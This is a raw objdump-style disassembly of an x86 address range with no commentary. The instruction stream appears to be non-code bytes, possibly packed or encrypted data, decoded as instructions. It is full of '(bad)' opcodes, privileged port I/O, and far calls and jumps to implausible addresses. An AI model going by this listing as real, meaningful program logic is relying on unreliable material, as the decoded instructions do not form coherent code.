  4191ec:	dec    esp
  4191ed:	popf   
  4191ee:	mov    edx,0x28f3976c
  4191f3:	mov    cl,BYTE PTR [edx+0x7]
  4191f6:	and    al,0x4d
  4191f8:	repnz dec esp
  4191fa:	ja     0x41925b
  4191fc:	or     BYTE PTR [edi+edi*8+0x17],0x4f
  419201:	pop    edi
  419202:	cmp    ebp,esi
  419204:	mov    al,ds:0x6aba0010
  419209:	std    
  41920a:	add    DWORD PTR [eax-0x51],edx
  41920d:	ins    BYTE PTR es:[edi],dx
  41920e:	outs   dx,DWORD PTR ds:[esi]
  41920f:	call   0xb4b:0x821d6edf
  419216:	or     BYTE PTR [esi-0x5f6878f2],bl
  41921c:	pop    ecx
  41921d:	repz jb 0x419266
  419220:	test   DWORD PTR [ecx],esi
  419222:	stos   DWORD PTR es:[edi],eax
  419223:	jae    0x419231
  419225:	clc    
  419226:	(bad)  [edi+0x309aa84]
  41922c:	enter  0xc7eb,0xf2
  419230:	sti    
  419231:	dec    edx
  419232:	xor    BYTE PTR [ebx-0x47db9fe5],ah
  419238:	outs   dx,DWORD PTR ds:[esi]
  419239:	or     ch,al
  41923b:	pop    ebp
  41923c:	out    0x38,eax
  41923e:	stc    
  41923f:	retf   0x80e3
  419242:	sub    BYTE PTR [ebx-0x2f26b85],ah
  419248:	out    dx,al
  419249:	aaa    
  41924a:	ja     0x4192a7
  41924c:	pusha  
  41924d:	rcl    DWORD PTR ds:0x8fb380a0,1
  419253:	retf   0x201b
  419256:	lds    ebx,FWORD PTR [edi-0x49]
  419259:	adc    edx,DWORD PTR [edi-0x6b]
  41925c:	or     al,0x88
  41925e:	and    al,0xcb
  419260:	jle    0x4191f6
  419262:	arpl   si,di
  419264:	fld    TBYTE PTR [eax-0x13661d6c]
  41926a:	mov    bl,0xa1
  41926c:	push   edi
  41926d:	inc    esp
  41926e:	inc    esp
  41926f:	jge    0x419289
  419271:	bound  eax,QWORD PTR [esi+0x6125eb0d]
  419277:	call   0x1b571936
  41927c:	mov    fs,ecx
  41927e:	popa   
  41927f:	xchg   BYTE PTR [esi-0x63],dl
  419282:	in     eax,dx
  419283:	jno    0x419256
  419285:	push   0x7a
  419287:	mov    bh,0xc
  419289:	gs push edi
  41928b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41928c:	std    
  41928d:	add    DWORD PTR [edx],eax
  41928f:	in     al,0x8
  419291:	ffree  st(2)
  419293:	mov    ebx,0x1ed1391f
  419298:	xor    eax,0x88ad8228
  41929d:	mov    esp,0x49a01cf8
  4192a2:	in     eax,0xe7
  4192a4:	mov    ebx,0x7de5d466
  4192a9:	inc    eax
  4192aa:	nop
  4192ab:	or     BYTE PTR [ebx+0x6db8ba],bh
  4192b1:	aad    0x88
  4192b3:	add    edx,DWORD PTR [ebx-0x7a]
  4192b6:	data16 jb 0x419264
  4192b9:	loope  0x419326
  4192bb:	and    BYTE PTR [ebx+0x3888825a],bl
	...
  419331:	add    BYTE PTR [eax],al
  419333:	add    ah,bl
  419335:	mov    bl,0x3f
  419337:	push   eax
  419338:	jg     0x419316
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	les    ebp,FWORD PTR [edi]
  419342:	ficom  WORD PTR [edx+edx*4]
  419345:	adc    DWORD PTR [ecx],eax
  419347:	add    ch,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    BYTE PTR [ebx+0xb],ch
  41934e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41934f:	es loop 0x419329
  419352:	xchg   esi,eax
  419353:	aas    
  419354:	mov    ah,0x1
  419356:	inc    ebp
  419357:	daa    
  419358:	loopne 0x41934b
  41935a:	or     DWORD PTR [esi+0xa],edi
  41935d:	out    dx,al
  41935e:	stos   BYTE PTR es:[edi],al
  41935f:	fldcw  WORD PTR [ebx+0x7ac945be]
  419365:	inc    esi
  419366:	xor    al,0x3d
  419368:	jge    0x4192f2
  41936a:	dec    esp
  41936b:	mov    dx,0x951c
  41936f:	test   DWORD PTR [edx-0x22bd5fbe],ecx
  419375:	mov    eax,0xb2d4966e
  41937a:	mov    dh,BYTE PTR [ebp-0x125877f4]
  419380:	push   es
  419381:	jl     0x41932c
  419383:	cmp    esi,DWORD PTR [ecx]
  419385:	mov    esi,0x524cecad
  41938a:	in     eax,dx
  41938b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41938c:	inc    ebx
  41938d:	outs   dx,DWORD PTR ds:[esi]
  41938e:	pop    ss
  41938f:	out    0x18,al
  419391:	add    al,0xe3
  419393:	dec    ecx
  419394:	cmp    dh,bl
  419396:	shr    DWORD PTR [eax+0x7a],cl
  419399:	nop
  41939a:	into   
  41939b:	xchg   ecx,eax
  41939c:	outs   dx,BYTE PTR ds:[esi]
  41939d:	xchg   esp,ebp
  41939f:	lea    ecx,[edx-0x7a]
  4193a2:	cmp    BYTE PTR [esi+esi*8],bl
  4193a5:	inc    esp
  4193a6:	gs sub BYTE PTR es:[eax-0x48],al
  4193ab:	xchg   edx,eax
  4193ad:	test   eax,0x83732fe9
  4193b2:	test   DWORD PTR [edi+0x71],esp
  4193b5:	push   0x61
  4193b7:	inc    eax
  4193b8:	(bad)  
  4193ba:	jnp    0x419433
  4193bc:	dec    ecx
  4193bd:	xchg   ebx,ebx
  4193bf:	mov    ds:0xeba4ae81,al
  4193c4:	dec    esi
  4193c5:	jo     0x4193ed
  4193c7:	adc    eax,0x10571c65
  4193cc:	push   ebp
  4193cd:	add    dh,BYTE PTR [edi-0x43bbc9f6]
  4193d3:	test   BYTE PTR [ebx+0x3f13b7c0],0x6e
  4193da:	xor    DWORD PTR [eax-0x4c],ecx
  4193dd:	cwde   
  4193de:	into   
  4193df:	arpl   WORD PTR [ebx+0x2d1204a1],dx
  4193e5:	sahf   
  4193e6:	loope  0x4193a6
  4193e8:	cs push eax
  4193ea:	ja     0x419428
  4193ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ed:	addr16 std 
  4193ef:	xchg   ebx,eax
  4193f0:	and    ch,BYTE PTR [eax-0x3efd94bf]
  4193f6:	pushf  
  4193f7:	push   esp
  4193f8:	jno    0x41938e
  4193fa:	icebp  
  4193fb:	out    dx,al
  4193fc:	mov    ds:0x123e325d,eax
  419401:	das    
  419402:	mov    al,0x9
  419404:	add    eax,0xb8cf4c5e
  419409:	sbb    BYTE PTR [edx-0x59780e1e],bl
  41940f:	adc    bl,0x9e
  419412:	adc    bh,0x56
  419415:	push   edx
  419416:	lahf   
  419417:	push   ebp
  419418:	adc    BYTE PTR [edi+ebp*4-0x7d],ah
  41941c:	addr16 movd edx,mm4
  419420:	inc    edx
  419421:	pop    ds
  419422:	rcr    BYTE PTR [edi],0x67
  419425:	sub    DWORD PTR [ebp+0x3a623f67],0xffffffd4
  41942c:	sub    eax,0x8f0cd59c
  419431:	jbe    0x419419
  419433:	call   0xa7fc:0x6c65d1b6
  41943a:	pop    ecx
  41943b:	js     0x4194b5
  41943d:	in     eax,0xf4
  41943f:	pop    eax
  419440:	loop   0x419442
	...
  4194b2:	add    BYTE PTR [eax],al
  4194b4:	inc    ecx
  4194b5:	stc    
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	xchg   esi,eax
  4194c1:	push   0x12873f60
  4194c6:	add    DWORD PTR [eax],eax
  4194c8:	cmc    
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    BYTE PTR ds:0x94f804f2,ah
  4194d1:	dec    edx
  4194d2:	sub    edx,ecx
  4194d4:	xor    DWORD PTR [eax-0x5394f950],ebp
  4194da:	adc    DWORD PTR [ecx-0x2e],eax
  4194dd:	or     esp,eax
  4194df:	pop    ss
  4194e0:	mov    DWORD PTR [esi+0x4a94b545],ebp
  4194e6:	inc    ecx
  4194e7:	cmp    cl,BYTE PTR [ebp+0x3a29a05]
  4194ed:	inc    ebp
  4194ee:	stos   DWORD PTR es:[edi],eax
  4194ef:	xor    edx,esp
  4194f1:	repz pop ecx
  4194f3:	imul   eax,ebx,0x5c
  4194f6:	or     esi,DWORD PTR [esi+0x724a090]
  4194fc:	outs   dx,BYTE PTR ds:[esi]
  4194fd:	lahf   
  4194fe:	and    dh,cl
  419500:	imul   esi,DWORD PTR ds:0xa3967334,0x3
  419507:	and    eax,0x4f7b67a4
  41950c:	xor    al,bl
  41950e:	pop    ss
  41950f:	dec    edi
  419510:	add    al,0x50
  419512:	cmp    ebp,ecx
  419514:	mov    edi,0xa8e65245
  419519:	adc    DWORD PTR [eax+ebx*8+0x4c],ebp
  41951d:	inc    ebp
  41951e:	arpl   WORD PTR [edx],ax
  419520:	out    0x3,eax
  419522:	lds    esi,FWORD PTR [esi-0x7b]
  419525:	sub    eax,0x2bcf58f0
  41952a:	repz shr BYTE PTR [eax],0x8d
  41952e:	ins    BYTE PTR es:[edi],dx
  41952f:	jo     0x4194f1
  419531:	ret    0x9f12
  419534:	clc    
  419535:	pop    ss
  419536:	out    0xcb,al
  419538:	inc    ebx
  419539:	cmp    BYTE PTR [ebx],dh
  41953b:	pushf  
  41953c:	in     eax,dx
  41953d:	repz fbld TBYTE PTR [esi+0x45]
  419541:	fndisi(8087 only) 
  419543:	ret    0x8f5e
  419546:	mov    esp,0x888b0873
  41954b:	or     dl,BYTE PTR [edi]
  41954d:	les    ecx,FWORD PTR ds:0x40e14cf8
  419553:	sub    bh,BYTE PTR [ebx+0x77a57172]
  419559:	sbb    dl,0xdd
  41955c:	cmc    
  41955d:	adc    eax,0xe872fe3d
  419562:	in     eax,0x9f
  419564:	cmp    DWORD PTR [edi-0x15],0xffffffc7
  419568:	fmul   QWORD PTR [edi+0x32]
  41956b:	mov    ebp,0xa9d356e4
  419570:	lds    eax,FWORD PTR [edi+0x7c37f0c8]
  419576:	sahf   
  419577:	cdq    
  419578:	cmp    eax,0x1a13cb1e
  41957d:	fs cdq 
  41957f:	repz pusha 
  419581:	jno    0x41957a
  419583:	ret    0xc757
  419586:	in     al,0xad
  419588:	xor    al,0xb2
  41958a:	aad    0xa8
  41958c:	sti    
  41958d:	mov    al,0x16
  41958f:	stos   DWORD PTR es:[edi],eax
  419590:	shr    BYTE PTR [edx+0x1ca3454b],1
  419596:	arpl   WORD PTR [esi-0x1f],di
  419599:	add    al,0xa3
  41959b:	sbb    al,bl
  41959d:	call   0x32c50452
  4195a2:	call   0xb628392c
  4195a7:	cmp    BYTE PTR [esi+0x61],dl
  4195aa:	retf   
  4195ab:	pushf  
  4195ac:	push   es
  4195ad:	and    ebp,DWORD PTR [edx+0x3fbf4278]
  4195b3:	and    BYTE PTR [eax],cl
  4195b5:	mov    esp,0x56dfee3
  4195ba:	sbb    BYTE PTR [ebx-0x2151efa9],0xed
	...
  419631:	add    BYTE PTR [eax],al
  419633:	add    BYTE PTR [ebx-0x44c35fd8],dl
  419639:	mov    esp,0xad76af9f
  41963e:	or     esp,DWORD PTR [eax-0x167d05b5]
  419644:	jl     0x419659
  419646:	add    DWORD PTR [eax],eax
  419648:	cmc    
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [edx],ah
  41964d:	ins    BYTE PTR es:[edi],dx
  41964e:	and    al,0xdb
  419650:	lods   eax,DWORD PTR ds:[esi]
  419651:	inc    esi
  419652:	repnz (bad) 
  419654:	cmp    ch,BYTE PTR [edx+0x15aeabf1]
  41965a:	push   ds
  41965b:	adc    ecx,edi
  41965d:	mov    bh,0x3b
  41965f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419660:	push   eax
  419661:	xor    BYTE PTR [ebx-0x11ed758c],0x6f
  419668:	cmp    cl,bh
  41966a:	call   0xa45e:0x4b617b05
  419671:	(bad)
  419674:	jle    0x419625
  419676:	loopne 0x4196b2
  419678:	fidiv  DWORD PTR [esi-0x13cbaba3]
  41967e:	or     DWORD PTR [eax+ebx*4+0x14],ebx
  419682:	lahf   
  419683:	dec    ecx
  419684:	retf   0xe75e
  419687:	inc    esi
  419688:	cmp    ebx,DWORD PTR [edi-0x44]
  41968b:	(bad)  
  41968c:	fld    QWORD PTR [esi]
  41968e:	mov    BYTE PTR [eax-0x9],bh
  419691:	mov    esp,0x8bac2ff4
  419696:	and    eax,0x3f1cafa1
  41969b:	inc    ebx
  41969c:	dec    edx
  41969e:	aad    0x99
  4196a0:	and    DWORD PTR [ebx*1-0x2221fdb1],edi
  4196a7:	xchg   ebx,eax
  4196a8:	enter  0x983b,0x31
  4196ac:	mov    DWORD PTR [ebx+0x28],edi
  4196af:	push   esi
  4196b0:	push   es
  4196b1:	in     eax,0xa0
  4196b3:	jmp    0x6f57a21f
  4196b8:	or     al,0xc5
  4196ba:	mov    dh,0x93
  4196bc:	fs cmp dh,cl
  4196bf:	jns    0x41972e
  4196c1:	retf   
  4196c2:	xlat   BYTE PTR ds:[ebx]
  4196c3:	or     DWORD PTR [ecx-0x40],ecx
  4196c6:	sbb    ah,al
  4196c8:	int3   
  4196c9:	push   ebx
  4196ca:	sahf   
  4196cb:	push   esi
  4196cc:	(bad)  
  4196cd:	sbb    ebp,DWORD PTR ds:0x9e4804fe
  4196d3:	out    dx,eax
  4196d4:	jmp    0x2e0b4e80
  4196d9:	dec    ebp
  4196da:	mov    ?,WORD PTR [esi+eax*2+0x18db594d]
  4196e1:	sub    eax,0xac09b446
  4196e6:	xchg   BYTE PTR [ecx+0x58],ah
  4196e9:	cmp    al,0x5f
  4196eb:	ret    0x2cff
  4196ee:	mov    esi,0xdc54b626
  4196f3:	jne    0x4196c0
  4196f5:	dec    esi
  4196f6:	sub    bh,BYTE PTR [esi-0xdd8a4a8]
  4196fc:	sbb    ebx,DWORD PTR [ebp+ecx*8+0x4e]
  419700:	fnstcw WORD PTR [eax-0x59a5f93a]
  419706:	mov    al,0x3f
  419708:	arpl   WORD PTR [edx+0x67],ax
  41970b:	inc    esi
  41970c:	in     al,0xb5
  41970e:	shr    BYTE PTR cs:[ecx+0x66fcfcdf],0x16
  419716:	inc    ecx
  419717:	pop    ecx
  419718:	cs test eax,0xeb377ae7
  41971e:	iret   
  41971f:	dec    esp
  419720:	imul   edi,edi,0x77
  419723:	cmp    ebx,eax
  419725:	aad    0x8c
  419727:	push   ebp
  419728:	mov    al,0x35
  41972a:	jg     0x419762
  41972c:	(bad)  
  41972d:	xchg   esi,eax
  41972e:	lods   al,BYTE PTR ds:[esi]
  41972f:	xor    al,0xa
  419731:	cmp    BYTE PTR [edi+eax*2-0x6c],bl
  419735:	repz cld 
  419737:	test   al,0x55
  419739:	mov    bh,0x91
  41973b:	aaa    
  41973c:	mov    eax,ds:0xb9d0fb21
	...
  4197b1:	add    BYTE PTR [eax],al
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx+0x4927cbe9]
  4197c1:	mov    dh,0xeb
  4197c3:	dec    ebp
  4197c4:	jno    0x4197da
  4197c6:	add    DWORD PTR [eax],eax
  4197c8:	cmc    
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [ebx+0x146b24aa],ch
  4197d1:	out    dx,eax
  4197d2:	(bad)  
  4197d3:	fnstenv [edx+eax*1-0x78f4e76f]
  4197da:	mov    ebx,fs
  4197dc:	pop    esi
  4197dd:	push   ebp
  4197de:	jbe    0x4197fd
  4197e0:	dec    edi
  4197e1:	or     eax,0x1eb734c9
  4197e6:	push   es
  4197e7:	loope  0x4197e8
  4197e9:	ins    BYTE PTR es:[edi],dx
  4197ea:	and    edx,ebx
  4197ec:	mov    ch,0x82
  4197ee:	sbb    edi,DWORD PTR [ebx+0x1ed07deb]
  4197f4:	xchg   ecx,eax
  4197f5:	inc    edi
  4197f6:	lods   al,BYTE PTR ds:[esi]
  4197f7:	out    0xdd,al
  4197f9:	ins    BYTE PTR es:[edi],dx
  4197fa:	call   0xfce6:0x5b2f4848
  419801:	sub    eax,0x76ee74b
  419806:	sbb    eax,ebp
  419808:	push   es
  419809:	cmc    
  41980a:	sbb    ebp,DWORD PTR [edx-0x34b8ceb]
  419810:	mov    esi,0xea1437d5
  419815:	xlat   BYTE PTR ds:[ebx]
  419816:	popa   
  419817:	paddusw mm5,QWORD PTR [ecx+0x6996a0c1]
  41981e:	jmp    0x4197d3
  419820:	mov    edi,0x282c1427
  419825:	inc    edx
  419826:	push   eax
  419827:	int3   
  419828:	gs (bad) 
  41982a:	(bad)  
  41982c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41982d:	mov    eax,0xedc23b9d
  419832:	adc    eax,0xcb936d7b
  419837:	in     eax,dx
  419838:	cmp    BYTE PTR [ebp+0x5c0d2949],ch
  41983e:	in     al,dx
  41983f:	jns    0x419898
  419841:	push   edx
  419842:	bound  eax,QWORD PTR [ebx-0x38]
  419845:	mov    bh,0x2a
  419847:	test   al,0x38
  419849:	out    0xfe,eax
  41984b:	fistp  WORD PTR ds:[ecx]
  41984e:	cmp    BYTE PTR [ecx+edi*8],cl
  419851:	fst    DWORD PTR [eax-0x474494b]
  419857:	(bad)  
  419858:	mov    ecx,0xe3af8397
  41985d:	pop    es
  41985e:	xchg   esi,eax
  41985f:	imul   ebp,ecx,0xd833be28
  419865:	pop    ds
  419866:	cmp    ebp,eax
  419868:	dec    ebx
  419869:	adc    eax,0x1e64625f
  41986e:	adc    ebp,DWORD PTR [edx]
  419870:	jae    0x419806
  419872:	or     DWORD PTR [bp+di],ecx
  419875:	inc    ecx
  419876:	in     al,0x40
  419878:	inc    edi
  419879:	not    BYTE PTR [ecx-0xceeab55]
  41987f:	mov    ebx,0x2aa0b27f
  419884:	int3   
  419885:	scas   al,BYTE PTR es:[edi]
  419886:	dec    ebp
  419887:	adc    bh,BYTE PTR [edi-0x37]
  41988a:	mov    dh,0xd9
  41988c:	dec    edi
  41988d:	cwde   
  41988e:	jg     0x4198b2
  419890:	lahf   
  419891:	in     al,0x27
  419893:	mov    eax,ds:0x53a42b63
  419898:	or     ch,BYTE PTR [ecx]
  41989a:	(bad)
  41989d:	sub    BYTE PTR [eax+0x52b8b],al
  4198a3:	push   edi
  4198a4:	xor    eax,0x351e7853
  4198a9:	xchg   edi,eax
  4198aa:	xor    eax,0xf33f61bf
  4198af:	push   ebp
  4198b0:	inc    eax
  4198b1:	loope  0x419920
  4198b3:	xor    BYTE PTR [ebx+0x553ab17d],cl
  4198b9:	jo     0x419859
  4198bb:	hlt    
  4198bc:	cmp    edi,DWORD PTR [eax+0x2b]
  4198bf:	jbe    0x4198d7
	...
  419931:	add    BYTE PTR [eax],al
  419933:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	adc    DWORD PTR ds:0x156677a9,edi
  419946:	add    DWORD PTR [eax],eax
  419948:	cmc    
  419949:	add    BYTE PTR [eax],al
  41994b:	add    BYTE PTR [ebp-0x1b5f3e62],dl
  419951:	imul   ecx,DWORD PTR [esp+esi*4-0x3fb5ba2c],0xffffff84
  419959:	int    0x79
  41995b:	mov    esi,0x1a8e7767
  419960:	push   ds
  419961:	fidiv  DWORD PTR [eax-0x6c]
  419964:	shr    DWORD PTR [edi],1
  419966:	push   edx
  419967:	push   ds
  419968:	jmp    0x5b33:0xa271eff4
  41996f:	stos   BYTE PTR es:[edi],al
  419970:	mov    es,WORD PTR [eax+0x9]
  419973:	and    eax,DWORD PTR [ebx]
  419975:	push   ss
  419976:	jge    0x4198ff
  419978:	int3   
  419979:	and    al,0x32
  41997b:	cmc    
  41997c:	mov    eax,ds:0x66b92766
  419981:	into   
  419982:	cmp    al,BYTE PTR [eax-0x672b3bee]
  419988:	jg     0x419982
  41998a:	mov    WORD PTR [ebx+ecx*8-0x5],fs
  41998e:	sbb    eax,DWORD PTR [eax+0x7c]
  419991:	or     DWORD PTR [edi],ecx
  419993:	xor    eax,0xa405567c
  419998:	sub    BYTE PTR [esi-0x37c13d65],bl
  41999e:	pop    edi
  41999f:	jmp    0x4199bc
  4199a1:	xchg   bl,al
  4199a3:	mov    esp,DWORD PTR [eax+0x58]
  4199a6:	sbb    al,0xc7
  4199a8:	xor    al,0xd5
  4199aa:	(bad)  
  4199ab:	rcr    al,0x63
  4199ae:	cdq    
  4199af:	loope  0x419a0f
  4199b1:	lods   al,BYTE PTR ds:[esi]
  4199b2:	mov    ch,0x64
  4199b4:	mov    DWORD PTR [ecx+0x70503d04],esp
  4199ba:	scas   al,BYTE PTR es:[edi]
  4199bb:	arpl   WORD PTR [ebp-0x53],dx
  4199be:	mov    esp,0x4b04c827
  4199c3:	ret    
  4199c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c5:	repnz dec ecx
  4199c7:	les    esi,FWORD PTR [edi+eiz*4+0x22c4c805]
  4199ce:	pop    es
  4199cf:	pop    esp
  4199d0:	mov    esp,0xc3dedf0e
  4199d5:	or     al,0x55
  4199d7:	jmp    0x4199fe
  4199d9:	test   BYTE PTR [ebp+ebx*2-0x38074955],bl
  4199e0:	inc    esp
  4199e1:	loop   0x41998c
  4199e3:	dec    ecx
  4199e4:	aad    0x4c
  4199e6:	xchg   esp,eax
  4199e7:	push   ecx
  4199e8:	add    DWORD PTR [edi+0x76779581],0xffffffe6
  4199ef:	stos   DWORD PTR es:[edi],eax
  4199f0:	out    dx,al
  4199f1:	jno    0x419a42
  4199f3:	(bad)  
  4199f4:	dec    DWORD PTR [ebx+0x33]
  4199f7:	and    ebp,DWORD PTR [ebx+eiz*1-0x28c22bec]
  4199fe:	jecxz  0x4199d9
  419a00:	test   al,0x61
  419a02:	xor    bl,BYTE PTR ds:0x3ad7581b
  419a08:	imul   esp,DWORD PTR [eax+0x3c435410],0x70f21918
  419a12:	in     al,dx
  419a13:	pop    edi
  419a14:	rol    DWORD PTR [esi],cl
  419a16:	xchg   ecx,eax
  419a17:	mov    ds:0xe751384d,al
  419a1c:	test   edi,edi
  419a1e:	pop    ds
  419a1f:	sub    ebp,DWORD PTR [esi]
  419a21:	scas   eax,DWORD PTR es:[edi]
  419a22:	data16 std 
  419a24:	ins    DWORD PTR es:[edi],dx
  419a25:	nop
  419a26:	mov    BYTE PTR [edx+0x7bcfe2c2],ch
  419a2c:	xlat   BYTE PTR ds:[ebx]
  419a2d:	cmp    al,0xde
  419a2f:	loopne 0x419a5a
  419a31:	test   DWORD PTR [ebp-0x2d],ebx
  419a34:	fcom   st(3)
  419a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a37:	mov    ?,WORD PTR [esi+0x74]
  419a3a:	(bad)  
  419a3b:	jno    0x419a74
  419a3d:	mov    BYTE PTR [edi-0x6a],0x59
	...
  419ab1:	add    BYTE PTR [eax],al
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0xd2357b47
  419ac1:	push   ebx
  419ac2:	adc    eax,0x1165bfc
  419ac7:	add    ch,dh
  419ac9:	add    BYTE PTR [eax],al
  419acb:	add    ah,dl
  419acd:	sub    ebp,DWORD PTR [edi+edi*1-0x19]
  419ad1:	inc    edi
  419ad2:	cmp    al,0xc7
  419ad4:	jle    0x419afd
  419ad6:	jmp    0xd120:0x8509f544
  419add:	sbb    BYTE PTR [edi+0x266815c9],dl
  419ae3:	add    ah,ah
  419ae5:	jno    0x419b35
  419ae7:	or     BYTE PTR [edi],cl
  419ae9:	leave  
  419aea:	bound  ecx,QWORD PTR [edi]
  419aec:	scas   eax,DWORD PTR es:[edi]
  419aed:	sub    DWORD PTR [eax-0x32],ebx
  419af0:	fwait
  419af1:	imul   ebp,DWORD PTR [ecx],0xffffffd3
  419af4:	jmp    0x419b2d
  419af6:	xchg   ebx,eax
  419af7:	adc    al,0xc3
  419af9:	inc    ebp
  419afa:	loop   0x419b1b
  419afc:	lds    ebp,FWORD PTR [ebp+0x4a]
  419aff:	clc    
  419b00:	loope  0x419ae4
  419b02:	jae    0x419b33
  419b04:	cmp    esi,DWORD PTR [ebp-0x65542aec]
  419b0a:	aam    0x15
  419b0c:	inc    DWORD PTR [edi-0x641fc7b6]
  419b12:	daa    
  419b13:	push   esp
  419b14:	jbe    0x419ae8
  419b16:	pop    eax
  419b17:	lods   al,BYTE PTR ds:[esi]
  419b18:	loop   0x419b72
  419b1a:	popf   
  419b1b:	call   0x61701b26
  419b20:	sbb    edi,DWORD PTR [eax]
  419b22:	aam    0x10
  419b24:	cld    
  419b25:	add    BYTE PTR [edx],ah
  419b27:	cmp    al,0xdd
  419b29:	dec    edi
  419b2a:	test   BYTE PTR [esi],dl
  419b2c:	push   edx
  419b2d:	sti    
  419b2e:	cmc    
  419b2f:	push   0xdef44a32
  419b34:	iret   
  419b35:	or     al,0x6e
  419b37:	ficom  DWORD PTR [edx]
  419b39:	dec    ecx
  419b3a:	mov    cl,0x14
  419b3c:	call   0xa83e:0x64a5cc2
  419b43:	mov    ah,0xeb
  419b45:	in     al,0x62
  419b47:	(bad)  
  419b48:	sar    edi,cl
  419b4a:	push   ds
  419b4b:	jge    0x419b0e
  419b4d:	bound  edi,QWORD PTR ds:0xebf3878d
  419b53:	dec    edx
  419b54:	jmp    0x4d005767
  419b59:	pop    ds
  419b5a:	fdivr  QWORD PTR [eax]
  419b5c:	dec    ecx
  419b5d:	jmp    0xa16:0x13a54129
  419b64:	loopne 0x419bb2
  419b66:	jecxz  0x419b7f
  419b68:	jae    0x419bb6
  419b6a:	mov    esi,0xb655a665
  419b6f:	mov    ch,0x2
  419b71:	in     eax,dx
  419b72:	mov    bl,0x40
  419b74:	test   al,0xf0
  419b76:	sub    eax,0x19784646
  419b7b:	rcr    ebp,cl
  419b7d:	add    eax,0xbc4fa9b2
  419b82:	xchg   edi,eax
  419b83:	mov    esi,0xbb2282e4
  419b88:	stos   DWORD PTR es:[edi],eax
  419b89:	in     al,0x2b
  419b8b:	push   0xd4925437
  419b90:	cmp    esp,DWORD PTR [ebx+edi*1]
  419b93:	sbb    esp,DWORD PTR [esi-0x653db042]
  419b99:	mov    esi,0x9187534a
  419b9e:	or     BYTE PTR [edi+ecx*8-0x39],bh
  419ba2:	addr16 jns 0x419b5d
  419ba5:	addr16 adc eax,0xcac293ce
  419bab:	mov    ds:0xcd3e4782,al
  419bb0:	or     al,0x5
  419bb2:	pushf  
  419bb3:	xchg   edx,eax
  419bb4:	add    ah,BYTE PTR [edx+0x6749b131]
  419bba:	mov    dl,cl
  419bbc:	out    dx,eax
  419bbd:	xchg   BYTE PTR [ebp+0xf421],bl
	...
  419c33:	add    bl,bh
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0xffffffaa
  419c41:	(bad)  
  419c42:	loop   0x419c21
  419c44:	push   eax
  419c45:	pop    ss
  419c46:	add    DWORD PTR [eax],eax
  419c48:	cmc    
  419c49:	add    BYTE PTR [eax],al
  419c4b:	add    BYTE PTR [edi-0xe],cl
  419c4e:	jecxz  0x419c32
  419c50:	sbb    BYTE PTR [edi-0x21],dl
  419c53:	lock into 
  419c55:	sbb    al,0xbc
  419c57:	dec    esp
  419c58:	ins    BYTE PTR es:[edi],dx
  419c59:	sub    DWORD PTR [eax+edi*8-0x1827f23b],edi
  419c60:	xor    BYTE PTR [eax-0x3f3d577b],dh
  419c66:	dec    ecx
  419c67:	aaa    
  419c68:	js     0x419c14
  419c6a:	pop    es
  419c6b:	fimul  WORD PTR ds:0x19de0321
  419c71:	mov    bh,0x3d
  419c73:	push   edi
  419c74:	pop    edi
  419c75:	std    
  419c76:	in     eax,0xdf
  419c78:	fmul   QWORD PTR [edi]
  419c7a:	mov    esp,0x48199f65
  419c7f:	jp     0x419c74
  419c81:	and    ah,BYTE PTR [esi+0x27]
  419c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c85:	jno    0x419c71
  419c87:	pop    ecx
  419c88:	fild   WORD PTR [ebx+0x16]
  419c8b:	int    0x16
  419c8d:	test   eax,0x900740b2
  419c92:	cmp    al,BYTE PTR [ecx-0x37ecf3b9]
  419c98:	dec    edx
  419c99:	mov    ch,0x1f
  419c9b:	and    al,0x2a
  419c9d:	mov    ebx,0x5c74751f
  419ca2:	sahf   
  419ca3:	dec    eax
  419ca4:	out    dx,al
  419ca5:	inc    esi
  419ca6:	bound  edi,QWORD PTR [edx]
  419ca8:	cli    
  419ca9:	xchg   edx,eax
  419caa:	sub    DWORD PTR [ebp-0x47],ecx
  419cad:	mov    eax,ds:0x556d6f1a
  419cb2:	mov    cl,0xd0
  419cb4:	jb     0x419c73
  419cb6:	pop    edx
  419cb7:	xchg   edi,eax
  419cb8:	jmp    0xd779:0x3400a3bf
  419cbf:	dec    ebx
  419cc0:	lock rol esp,cl
  419cc3:	inc    esi
  419cc4:	std    
  419cc5:	fcmovb st,st(7)
  419cc7:	inc    ecx
  419cc8:	fisubr DWORD PTR [ecx+0x43]
  419ccb:	sbb    al,0xa
  419ccd:	test   BYTE PTR ds:0xa46c02a4,dh
  419cd3:	nop
  419cd4:	outs   dx,BYTE PTR ds:[esi]
  419cd5:	ja     0x419d33
  419cd7:	call   0xe0eb:0x8e9ad341
  419cde:	xchg   DWORD PTR [edi+0xa],esi
  419ce1:	aad    0x15
  419ce3:	inc    edi
  419ce4:	pop    edx
  419ce5:	xchg   ecx,eax
  419ce6:	dec    esp
  419ce7:	imul   edx,DWORD PTR [ecx+eiz*4]
  419ceb:	in     al,dx
  419cec:	rol    bh,0xe9
  419cef:	das    
  419cf0:	cs push ebp
